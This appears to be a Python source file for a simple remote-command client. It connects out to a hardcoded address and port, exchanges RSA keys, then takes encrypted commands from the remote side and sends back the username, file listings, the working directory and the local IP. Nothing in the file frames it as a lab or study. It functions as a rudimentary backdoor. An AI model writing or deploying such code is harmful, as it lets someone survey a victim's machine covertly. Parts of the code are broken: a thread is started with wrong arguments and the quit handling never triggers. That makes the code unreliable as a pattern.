import os
import threading
import socket
import rsa
import getpass

try:
    os.mkdir('menus')
except FileExistsError:
    pass
except NotADirectoryError:
    pass

public_key, private_key = rsa.newkeys(1024)
public_partner = None

IP = '192.168.100.154'
PORT = 9191
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((IP, PORT))
public_partner = rsa.PublicKey.load_pkcs1(client.recv(1024))
client.send(public_key.save_pkcs1("PEM"))

########## Flags -commands ##########

def handle_command(command, c):
    ####### Globals ########
    global command_response ## response
    global response_list ## response list []
    global menu_num
    global menu_list
    
    if command == 'whoami':
        command_response = getpass.getuser()
    elif command == ':quit':
        quit()
    elif command == 'ls':
        response_list = []
        for i in os.listdir():
            response_list.append(i)
        command_response = '\n'.join(response_list)
    elif command == 'cwd':
        command_response = os.getcwd()
    elif command == '-o menu':
        response_list = []
        try:
            for i in os.listdir('menus'):
                response_list.append(i)
            if response_list is None:
                command_response = 'No Menu found in Menus folder'
            else:
                command_response = '\n'.join(response_list)
        except Exception as e:
            command_response = str(e)
    elif command == 'ipconfig':
        command_response = socket.gethostbyname(socket.gethostname())
    else:
        command_response = None
        
def recv_resp_command(c):
    global quit_command
    quit_command = False
    while True:
        try:
            message = rsa.decrypt(c.recv(1024), private_key).decode()
            handle_command(message, c)
            if command_response is not None and quit_command is False:
                c.send(rsa.encrypt(command_response.encode(), public_partner))
            elif quit_command:
                break
        except Exception as e:
            print(e)
            break
    c.close()

threading.Thread(target=recv_resp_command, args=(client,)).start()
threading.Thread(target=handle_command, args=(client,)).start()
